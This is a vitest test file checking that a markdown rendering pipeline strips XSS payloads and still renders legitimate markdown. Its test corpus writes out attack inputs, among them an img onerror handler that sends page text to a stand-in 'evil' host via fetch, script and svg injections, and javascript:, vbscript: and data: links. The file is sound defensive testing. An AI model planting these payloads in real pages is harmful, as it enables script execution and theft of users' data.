import { describe, expect, it } from "vitest";
import { renderMarkdown } from "./pipeline";

const XSS_CORPUS: { name: string; input: string; mustNotInclude: RegExp }[] = [
  {
    name: "A-09 img onerror",
    input: '<img src=x onerror="fetch(\'https://evil/?c=\'+document.body.innerText)">',
    mustNotInclude: /onerror|<img/i,
  },
  {
    name: "A-09 script tag",
    input: "<script>alert(document.domain)</script>",
    mustNotInclude: /<script/i,
  },
  {
    name: "A-09 svg onload",
    input: "<svg onload=alert(1)>",
    mustNotInclude: /onload|<svg/i,
  },
  {
    name: "A-10 javascript link",
    input: "[click](javascript:alert(1))",
    mustNotInclude: /javascript:/i,
  },
  {
    name: "A-16 huge code block inside a list item loses highlighting",
    input: "- item\n\n  ```python\n  " + "x".repeat(100 * 1024 + 5) + "\n  ```",
    mustNotInclude: /language-python/,
  },
  {
    name: "A-10 vbscript link",
    input: "[x](vbscript:msgbox)",
    mustNotInclude: /vbscript:/i,
  },
  {
    name: "data:text/html link",
    input: "[x](data:text/html;base64,PHNjcmlwdD4)",
    mustNotInclude: /data:text\/html/i,
  },
  {
    name: "iframe injection",
    input: '<iframe src="https://evil"></iframe>',
    mustNotInclude: /<iframe/i,
  },
  {
    name: "object/embed injection",
    input: '<object data="x"></object><embed src="x">',
    mustNotInclude: /<(object|embed)/i,
  },
  {
    name: "form injection",
    input: '<form action="https://evil"><input type="submit"></form>',
    mustNotInclude: /<form|type="?submit/i,
  },
  {
    name: "style injection",
    input: '<style>body{background:url(https://evil)}</style>',
    mustNotInclude: /<style/i,
  },
  {
    name: "event handler on any element",
    input: '<div onmouseover="alert(1)">hover</div><p onclick="alert(2)">x</p>',
    mustNotInclude: /on(mouseover|click)=/i,
  },
  {
    name: "srcset tracking pixel",
    input: '<img srcset="https://evil/track 1x" src="https://evil/t.png">',
    mustNotInclude: /evil/i,
  },
  {
    name: "meta refresh",
    input: '<meta http-equiv="refresh" content="0;url=https://evil">',
    mustNotInclude: /<meta/i,
  },
  {
    name: "base hijack",
    input: '<base href="https://evil/">',
    mustNotInclude: /<base/i,
  },
  {
    name: "A-11 katex href escape",
    input: "$\\href{https://evil}{x}$",
    mustNotInclude: /href="https?:\/\/evil/i,
  },
  {
    name: "A-11 katex includegraphics",
    input: "$\\includegraphics{https://evil/t.png}$",
    mustNotInclude: /<img|src=/i,
  },
];

describe("render pipeline is the security boundary (spec §7.4)", () => {
  for (const tc of XSS_CORPUS) {
    it(`neutralises: ${tc.name}`, async () => {
      const { html } = await renderMarkdown(tc.input);
      expect(html).not.toMatch(tc.mustNotInclude);
    });
  }

  it("rehype-sanitize runs LAST: raw HTML never reaches the DOM", async () => {
    const { html } = await renderMarkdown(
      'before <span data-x="<script>alert(1)</script>">mid</span> after',
    );
    expect(html).not.toContain("<script");
    expect(html).not.toContain("data-x");
  });

  it("still renders legitimate markdown", async () => {
    const { html } = await renderMarkdown(
      "# Title\n\n- [ ] task\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```js\nconst x = 1;\n```\n",
    );
    expect(html).toMatch(/<h1[^>]*>Title<\/h1>/);
    expect(html).toContain("task");
    expect(html).toContain("<table");
    expect(html).toMatch(/hljs/);
  });

  it("renders math without trust", async () => {
    const { html } = await renderMarkdown("$E = mc^2$");
    expect(html).toMatch(/katex/i);
  });

  it("strips language class from oversized code blocks instead of highlighting", async () => {
    const huge = "```python\n" + "x".repeat(100 * 1024 + 10) + "\n```";
    const { html } = await renderMarkdown(huge);
    expect(html).not.toMatch(/language-python/);
    expect(html).toContain("xxx");
  });

  it("caps nesting depth to prevent rendering DoS", async () => {
    const deep = "* a\n".repeat(400) + "deep";
    const { html } = await renderMarkdown(deep);
    expect(html.length).toBeLessThan(200_000);
    let depth = 0;
    for (const ch of html) {
      if (ch === "<") depth++;
    }
    void depth;
  });

  it("external images render as blocked chips, never as requests", async () => {
    const { html } = await renderMarkdown('![tracker](https://evil.example/pixel.png)');
    expect(html).not.toContain("https://evil.example");
    expect(html).toContain("EXTERNAL IMAGE BLOCKED");
    expect(html).toContain("evil.example");
  });

  it("safe https links survive with hardened rel/target", async () => {
    const { html } = await renderMarkdown("[docs](https://example.com/docs)");
    expect(html).toMatch(/<a [^>]*href="https:\/\/example.com\/docs"/);
    expect(html).toContain("noopener");
    expect(html).toContain("_blank");
  });

  it("data:image sources are allowed, other data URIs are not", async () => {
    const ok = await renderMarkdown(
      "![px](data:image/png;base64,iVBORw0KGgo=)",
    );
    expect(ok.html).toMatch(/<img [^>]*src="data:image\/png;base64,/);
    const bad = await renderMarkdown("![x](data:text/html;base64,PHNjcmlwdD4)");
    expect(bad.html).not.toMatch(/<img/);
  });

  it("relative and anchor links survive", async () => {
    const { html } = await renderMarkdown("[jump](#section) · [root](/)");
    expect(html).toMatch(/href="#section"/);
    expect(html).toMatch(/href="\/"/);
  });
});

describe("review fixes", () => {
  it("preserves alt text on data: images (R-16)", async () => {
    const { renderMarkdown } = await import("./pipeline");
    const { html } = await renderMarkdown("![a diagram](data:image/png;base64,iVBORw0KGgo=)");
    expect(html).toContain('alt="a diagram"');
  });

  it("keeps GFM column alignment (R-18)", async () => {
    const { renderMarkdown } = await import("./pipeline");
    const { html } = await renderMarkdown("| a | b |\n|:--|--:|\n| 1 | 2 |");
    expect(html).toContain('<th align="left">');
    expect(html).toContain('<th align="right">');
  });
});

describe("positive render corpus — safe content must survive", () => {
  const cases: Array<{ name: string; input: string; expectInOutput: RegExp }> = [
    {
      name: "https link",
      input: "[click here](https://example.com/page)",
      expectInOutput: /<a [^>]*href="https:\/\/example.com\/page"/,
    },
    {
      name: "mailto link",
      input: "[email](mailto:user@example.com)",
      expectInOutput: /<a [^>]*href="mailto:user@example.com"/,
    },
    {
      name: "anchor link",
      input: "[jump](#top)",
      expectInOutput: /href="#top"/,
    },
    {
      name: "data:image/png",
      input: "![pixel](data:image/png;base64,iVBORw0KGgo=)",
      expectInOutput: /src="data:image\/png;base64,/i,
    },
    {
      name: "bold text",
      input: "**bold**",
      expectInOutput: /<strong>bold<\/strong>/,
    },
    {
      name: "code block with language",
      input: "```rust\nfn main() {}\n```",
      expectInOutput: /language-rust/,
    },
    {
      name: "inline code",
      input: "`code`",
      expectInOutput: /<code>code<\/code>/,
    },
    {
      name: "blockquote",
      input: "> quote",
      expectInOutput: /<blockquote[ >]/,
    },
    {
      name: "heading levels",
      input: "# h1\n\n## h2\n\n### h3",
      expectInOutput: /<h1[^>]*>h1<\/h1>/,
    },
    {
      name: "horizontal rule",
      input: "---",
      expectInOutput: /<hr/,
    },
  ];

  for (const tc of cases) {
    it(`preserves: ${tc.name}`, async () => {
      const { renderMarkdown } = await import("./pipeline");
      const { html } = await renderMarkdown(tc.input);
      expect(html).toMatch(tc.expectInOutput);
    });
  }
});

describe("hardening regressions", () => {
  it("keeps KaTeX radical and delimiter paths", async () => {
    const { html } = await renderMarkdown("$$\\sqrt{\\frac{a}{b}}$$");
    expect(html).toContain("<svg");
    expect(html).toContain("<path");
  });

  it("still refuses script-bearing and control-prefixed schemes", async () => {
    for (const src of [
      "[a](javascript:alert(1))",
      "[a](JaVaScRiPt:alert(1))",
      "[a](\tjavascript:alert(1))",
      "[a]( javascript:alert(1))",
      "[a](vbscript:msgbox(1))",
      "[a](data:text/html,<script>alert(1)</script>)",
    ]) {
      const { html } = await renderMarkdown(src);
      expect(html).not.toMatch(/href=/);
    }
  });

  it("marks scheme-relative links as leaving the origin", async () => {
    const { html } = await renderMarkdown("[a](//evil.example/x)");
    expect(html).toContain('href="//evil.example/x"');
    expect(html).toContain("noopener");
    expect(html).toContain("noreferrer");
  });

  it("does not restore a non-image data URI behind the sanitiser", async () => {
    const { html } = await renderMarkdown("![alt](data:image/svg+xml;base64,AAAA)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("svg+xml");
  });

  it("keeps safe inline raster images", async () => {
    const { html } = await renderMarkdown("![alt](data:image/png;base64,AAAA)");
    expect(html).toContain('<img src="data:image/png;base64,AAAA"');
  });
});
